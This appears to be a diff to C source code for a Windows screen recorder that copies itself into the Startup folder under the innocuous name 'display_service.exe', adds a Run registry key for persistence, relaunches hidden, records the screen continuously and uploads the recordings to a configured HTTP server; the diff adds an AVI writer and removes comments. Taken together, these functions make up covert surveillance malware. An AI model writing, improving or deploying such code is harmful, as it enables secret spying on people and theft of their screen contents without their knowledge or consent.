@@ -5,61 +5,55 @@
 #include <stdio.h>
 #include <time.h>
 #include <string.h>
+#include <stdint.h>
 
 #pragma comment(lib, "wininet.lib")
 #pragma comment(lib, "gdi32.lib")
 #pragma comment(lib, "shell32.lib")
 
 // ─── CONFIG ───────────────────────────────────────────────────────────────────
-#define RECORD_SECONDS   60       // Duration of each recording segment
-#define FPS              5        // Frames per second
-#define EXE_NAME         "display_service.exe"   // Name used in startup folder
+#define RECORD_SECONDS   60
+#define FPS              10
+#define EXE_NAME         "display_service.exe"
 #define CFG_NAME         "recorder.cfg"
-#define RECORDINGS_DIR   "Recordings"            // Subfolder inside startup folder
+#define RECORDINGS_DIR   "Recordings"
 // ──────────────────────────────────────────────────────────────────────────────
 
 typedef struct {
-    char upload_url[512];   // HTTP upload URL  (leave blank to skip)
-    char auth_token[256];   // Auth token       (leave blank if not needed)
+    char upload_url[512];
+    char auth_token[256];
 } Config;
 
 // ─────────────────────────────────────────────────────────────────────────────
 // PATH HELPERS
 // ─────────────────────────────────────────────────────────────────────────────
 
-// Get full path of currently running .exe
 void get_exe_path(char *buf, size_t size) {
     GetModuleFileName(NULL, buf, (DWORD)size);
 }
 
-// Get folder of currently running .exe
 void get_exe_dir(char *buf, size_t size) {
     get_exe_path(buf, size);
     char *slash = strrchr(buf, '\\');
     if (slash) *slash = '\0';
 }
 
-// Get Windows startup folder path for current user:
-// C:\Users\<name>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 void get_startup_folder(char *buf, size_t size) {
     SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, buf);
 }
 
-// Build path to our installed .exe inside startup folder
 void get_installed_exe(char *buf, size_t size) {
     char startup[MAX_PATH] = {0};
     get_startup_folder(startup, sizeof(startup));
     snprintf(buf, size, "%s\\%s", startup, EXE_NAME);
 }
 
-// Build path to recordings subfolder inside startup folder
 void get_recordings_dir(char *buf, size_t size) {
     char startup[MAX_PATH] = {0};
     get_startup_folder(startup, sizeof(startup));
     snprintf(buf, size, "%s\\%s", startup, RECORDINGS_DIR);
 }
 
-// Build path to config file inside startup folder
 void get_installed_cfg(char *buf, size_t size) {
     char startup[MAX_PATH] = {0};
     get_startup_folder(startup, sizeof(startup));
@@ -70,61 +64,46 @@ void get_installed_cfg(char *buf, size_t size) {
 // SELF-INSTALL
 // ─────────────────────────────────────────────────────────────────────────────
 
-// Returns 1 if this process is already running from the startup folder
 int is_running_from_startup() {
     char exe_path[MAX_PATH] = {0};
     char installed[MAX_PATH] = {0};
     get_exe_path(exe_path, sizeof(exe_path));
     get_installed_exe(installed, sizeof(installed));
-
-    // Case-insensitive compare
     return (_stricmp(exe_path, installed) == 0);
 }
 
-// Copy self + config to startup folder, add registry run key, then relaunch
 void self_install() {
-    char startup[MAX_PATH]      = {0};
-    char exe_src[MAX_PATH]      = {0};
-    char exe_dst[MAX_PATH]      = {0};
-    char cfg_src[MAX_PATH]      = {0};
-    char cfg_dst[MAX_PATH]      = {0};
-    char rec_dir[MAX_PATH]      = {0};
+    char startup[MAX_PATH] = {0};
+    char exe_src[MAX_PATH] = {0};
+    char exe_dst[MAX_PATH] = {0};
+    char cfg_src[MAX_PATH] = {0};
+    char cfg_dst[MAX_PATH] = {0};
+    char rec_dir[MAX_PATH] = {0};
+    char exe_dir[MAX_PATH] = {0};
 
     get_startup_folder(startup, sizeof(startup));
     get_exe_path(exe_src, sizeof(exe_src));
     get_installed_exe(exe_dst, sizeof(exe_dst));
     get_recordings_dir(rec_dir, sizeof(rec_dir));
     get_installed_cfg(cfg_dst, sizeof(cfg_dst));
-
-    // Get config path next to current exe
-    char exe_dir[MAX_PATH] = {0};
     get_exe_dir(exe_dir, sizeof(exe_dir));
     snprintf(cfg_src, sizeof(cfg_src), "%s\\%s", exe_dir, CFG_NAME);
 
-    // 1. Create recordings folder
     CreateDirectory(rec_dir, NULL);
-
-    // 2. Copy exe to startup folder (overwrite if already there)
     CopyFile(exe_src, exe_dst, FALSE);
 
-    // 3. Copy config if it exists next to the source exe
     if (GetFileAttributes(cfg_src) != INVALID_FILE_ATTRIBUTES) {
         CopyFile(cfg_src, cfg_dst, FALSE);
     } else {
-        // Create a blank default config in startup folder
         FILE *f = fopen(cfg_dst, "w");
         if (f) {
             fprintf(f, "# Screen Recorder Config\n");
-            fprintf(f, "# Set upload_url to send recordings to your HTTP server\n");
-            fprintf(f, "# Leave blank to only save locally (in Recordings folder)\n\n");
             fprintf(f, "upload_url=\n");
             fprintf(f, "auth_token=\n");
             fclose(f);
         }
     }
 
-    // 4. Add registry key so it runs on every boot
-    //    HKCU\Software\Microsoft\Windows\CurrentVersion\Run
     HKEY hkey;
     if (RegOpenKeyEx(HKEY_CURRENT_USER,
                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
@@ -134,7 +113,6 @@ void self_install() {
         RegCloseKey(hkey);
     }
 
-    // 5. Relaunch from startup folder and exit current instance
     ShellExecute(NULL, "open", exe_dst, NULL, startup, SW_HIDE);
     ExitProcess(0);
 }
@@ -146,10 +124,8 @@ void self_install() {
 void read_config(Config *cfg) {
     char cfg_path[MAX_PATH] = {0};
     get_installed_cfg(cfg_path, sizeof(cfg_path));
-
     FILE *f = fopen(cfg_path, "r");
     if (!f) return;
-
     char line[768];
     while (fgets(line, sizeof(line), f)) {
         line[strcspn(line, "\r\n")] = 0;
@@ -195,32 +171,167 @@ BYTE* capture_frame(int *out_w, int *out_h) {
     return pixels;
 }
 
-void record_segment(const char *filepath) {
-    int fps          = FPS;              // local var so we can take its address
-    int total_frames = RECORD_SECONDS * fps;
-    int delay_ms     = 1000 / fps;
+// ─────────────────────────────────────────────────────────────────────────────
+// AVI WRITER — uncompressed BGR24, opens in VLC / Windows Media Player / any player
+// ─────────────────────────────────────────────────────────────────────────────
+
+static void write_u32(FILE *f, uint32_t v) { fwrite(&v, 4, 1, f); }
+static void write_u16(FILE *f, uint16_t v) { fwrite(&v, 2, 1, f); }
+static void write_tag(FILE *f, const char *t) { fwrite(t, 4, 1, f); }
+
+typedef struct {
+    uint32_t flags;
+    uint32_t offset;
+    uint32_t size;
+} IdxEntry;
+
+void record_avi(const char *filepath) {
+    int fps_val      = FPS;
+    int total_frames = RECORD_SECONDS * fps_val;
+    int delay_ms     = 1000 / fps_val;
+
+    // Capture first frame to know dimensions
+    int w = 0, h = 0;
+    BYTE *first_frame = capture_frame(&w, &h);
+    int row_size   = ((w * 3 + 3) & ~3);
+    int frame_size = row_size * h;
 
     FILE *f = fopen(filepath, "wb");
-    if (!f) return;
+    if (!f) { free(first_frame); return; }
 
-    fwrite("SREC", 4, 1, f);
-    fwrite(&fps,          sizeof(int), 1, f);
-    fwrite(&total_frames, sizeof(int), 1, f);
+    // Index: one entry per frame
+    IdxEntry *idx = (IdxEntry*)malloc(total_frames * sizeof(IdxEntry));
+    int nframes = 0;
 
-    for (int i = 0; i < total_frames; i++) {
-        int w, h;
-        BYTE *pixels  = capture_frame(&w, &h);
-        int row_size  = ((w * 3 + 3) & ~3);
-        int data_size = row_size * h;
+    // ── RIFF AVI header ───────────────────────────────────────────────────────
+    write_tag(f, "RIFF");
+    long riff_size_off = ftell(f); write_u32(f, 0);
+    write_tag(f, "AVI ");
 
-        fwrite(&w,         sizeof(int), 1, f);
-        fwrite(&h,         sizeof(int), 1, f);
-        fwrite(&data_size, sizeof(int), 1, f);
-        fwrite(pixels,     data_size,   1, f);
+    // LIST hdrl
+    write_tag(f, "LIST");
+    long hdrl_size_off = ftell(f); write_u32(f, 0);
+    write_tag(f, "hdrl");
 
-        free(pixels);
+    // avih (Main AVI Header)
+    write_tag(f, "avih"); write_u32(f, 56);
+    write_u32(f, (uint32_t)(1000000 / fps_val)); // us per frame
+    write_u32(f, (uint32_t)(frame_size * fps_val)); // max bytes/sec
+    write_u32(f, 0);        // padding
+    write_u32(f, 0x10);     // AVIF_HASINDEX
+    long avih_frames_off = ftell(f);
+    write_u32(f, (uint32_t)total_frames);
+    write_u32(f, 0);        // initial frames
+    write_u32(f, 1);        // streams
+    write_u32(f, (uint32_t)frame_size); // buffer size
+    write_u32(f, (uint32_t)w);
+    write_u32(f, (uint32_t)h);
+    write_u32(f,0); write_u32(f,0); write_u32(f,0); write_u32(f,0);
+
+    // LIST strl
+    write_tag(f, "LIST");
+    long strl_size_off = ftell(f); write_u32(f, 0);
+    write_tag(f, "strl");
+
+    // strh (Stream Header)
+    write_tag(f, "strh"); write_u32(f, 56);
+    write_tag(f, "vids");
+    write_tag(f, "\0\0\0\0"); // uncompressed
+    write_u32(f, 0);  // flags
+    write_u16(f, 0);  // priority
+    write_u16(f, 0);  // language
+    write_u32(f, 0);  // initial frames
+    write_u32(f, 1);  // scale
+    write_u32(f, (uint32_t)fps_val); // rate
+    write_u32(f, 0);  // start
+    write_u32(f, (uint32_t)total_frames);
+    write_u32(f, (uint32_t)frame_size);
+    write_u32(f, (uint32_t)-1); // quality
+    write_u32(f, 0);  // sample size
+    write_u16(f, 0); write_u16(f, 0);
+    write_u16(f, (uint16_t)w); write_u16(f, (uint16_t)h);
+
+    // strf (BITMAPINFOHEADER)
+    write_tag(f, "strf"); write_u32(f, 40);
+    write_u32(f, 40);
+    write_u32(f, (uint32_t)w);
+    write_u32(f, (uint32_t)h);
+    write_u16(f, 1);   // planes
+    write_u16(f, 24);  // bit count
+    write_u32(f, 0);   // BI_RGB
+    write_u32(f, (uint32_t)frame_size);
+    write_u32(f, 0); write_u32(f, 0);
+    write_u32(f, 0); write_u32(f, 0);
+
+    // Patch strl size
+    long pos = ftell(f);
+    fseek(f, strl_size_off, SEEK_SET);
+    write_u32(f, (uint32_t)(pos - strl_size_off - 4));
+    fseek(f, pos, SEEK_SET);
+
+    // Patch hdrl size
+    pos = ftell(f);
+    fseek(f, hdrl_size_off, SEEK_SET);
+    write_u32(f, (uint32_t)(pos - hdrl_size_off - 4));
+    fseek(f, pos, SEEK_SET);
+
+    // LIST movi
+    write_tag(f, "LIST");
+    long movi_size_off = ftell(f); write_u32(f, 0);
+    write_tag(f, "movi");
+    long movi_start = ftell(f);
+
+    // ── Write frames ──────────────────────────────────────────────────────────
+    // Helper lambda-style macro to write one frame and record its index entry
+    #define WRITE_FRAME(pixels_ptr) do { \
+        long chunk_off = ftell(f); \
+        write_tag(f, "00dc"); \
+        write_u32(f, (uint32_t)frame_size); \
+        fwrite((pixels_ptr), frame_size, 1, f); \
+        if (frame_size & 1) fputc(0, f); \
+        idx[nframes].flags  = 0x10; \
+        idx[nframes].offset = (uint32_t)(chunk_off - movi_start); \
+        idx[nframes].size   = (uint32_t)frame_size; \
+        nframes++; \
+    } while(0)
+
+    WRITE_FRAME(first_frame);
+    free(first_frame);
+
+    for (int i = 1; i < total_frames; i++) {
         Sleep(delay_ms);
+        int fw, fh;
+        BYTE *pix = capture_frame(&fw, &fh);
+        WRITE_FRAME(pix);
+        free(pix);
     }
+
+    // Patch movi size
+    pos = ftell(f);
+    fseek(f, movi_size_off, SEEK_SET);
+    write_u32(f, (uint32_t)(pos - movi_size_off - 4));
+    fseek(f, pos, SEEK_SET);
+
+    // ── idx1 index ────────────────────────────────────────────────────────────
+    write_tag(f, "idx1");
+    write_u32(f, (uint32_t)(nframes * 16));
+    for (int i = 0; i < nframes; i++) {
+        write_tag(f, "00dc");
+        write_u32(f, idx[i].flags);
+        write_u32(f, idx[i].offset + 4); // +4: offset from "movi" tag itself
+        write_u32(f, idx[i].size);
+    }
+    free(idx);
+
+    // Patch avih frame count
+    fseek(f, avih_frames_off, SEEK_SET);
+    write_u32(f, (uint32_t)nframes);
+
+    // Patch RIFF size
+    fseek(f, 0, SEEK_END);
+    long file_size = ftell(f);
+    fseek(f, riff_size_off, SEEK_SET);
+    write_u32(f, (uint32_t)(file_size - 8));
 
     fclose(f);
 }
@@ -300,10 +411,10 @@ int upload_file(const char *filepath, const Config *cfg) {
     snprintf(all_headers, sizeof(all_headers), "%s%s", content_type, extra_headers);
 
     BYTE *body = (BYTE*)malloc(total_size);
-    DWORD offset = 0;
-    memcpy(body + offset, head, strlen(head)); offset += (DWORD)strlen(head);
-    memcpy(body + offset, fbuf, fsize);        offset += fsize;
-    memcpy(body + offset, tail, strlen(tail));
+    DWORD off = 0;
+    memcpy(body + off, head, strlen(head)); off += (DWORD)strlen(head);
+    memcpy(body + off, fbuf, fsize);        off += fsize;
+    memcpy(body + off, tail, strlen(tail));
     free(fbuf);
 
     BOOL ok = HttpSendRequest(hReq, all_headers, (DWORD)strlen(all_headers),
@@ -317,13 +428,13 @@ int upload_file(const char *filepath, const Config *cfg) {
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
-// FILENAME
+// FILENAME — .avi
 // ─────────────────────────────────────────────────────────────────────────────
 
 void make_filename(char *buf, size_t size) {
     time_t t = time(NULL);
     struct tm *tm = localtime(&t);
-    snprintf(buf, size, "rec_%04d%02d%02d_%02d%02d%02d.srec",
+    snprintf(buf, size, "rec_%04d%02d%02d_%02d%02d%02d.avi",
              tm->tm_year + 1900, tm->tm_mon + 1, tm->tm_mday,
              tm->tm_hour, tm->tm_min, tm->tm_sec);
 }
@@ -334,42 +445,32 @@ void make_filename(char *buf, size_t size) {
 
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
 
-    // ── STEP 1: Self-install if not already running from startup folder ────────
     if (!is_running_from_startup()) {
-        self_install(); // copies itself, adds registry key, relaunches, exits
-        return 0;       // never reached — self_install calls ExitProcess
+        self_install();
+        return 0;
     }
 
-    // ── STEP 2: Now running from startup folder — wait for boot to settle ─────
     Sleep(5000);
 
-    // ── STEP 3: Load config ───────────────────────────────────────────────────
     Config cfg = {0};
     read_config(&cfg);
 
-    // ── STEP 4: Get recordings folder path ────────────────────────────────────
     char rec_dir[MAX_PATH] = {0};
     get_recordings_dir(rec_dir, sizeof(rec_dir));
-    CreateDirectory(rec_dir, NULL); // ensure it exists
+    CreateDirectory(rec_dir, NULL);
 
-    // ── STEP 5: Record loop ───────────────────────────────────────────────────
     while (1) {
         char filename[64];
         make_filename(filename, sizeof(filename));
 
-        // Save recording directly into Recordings subfolder
         char rec_path[MAX_PATH] = {0};
         snprintf(rec_path, sizeof(rec_path), "%s\\%s", rec_dir, filename);
 
-        // Record segment
-        record_segment(rec_path);
+        record_avi(rec_path);
 
-        // Upload if configured (recording stays saved locally regardless)
         if (cfg.upload_url[0] != '\0') {
             upload_file(rec_path, &cfg);
         }
-
-        // Note: we do NOT delete rec_path — recordings are kept locally always
     }
 
     return 0;
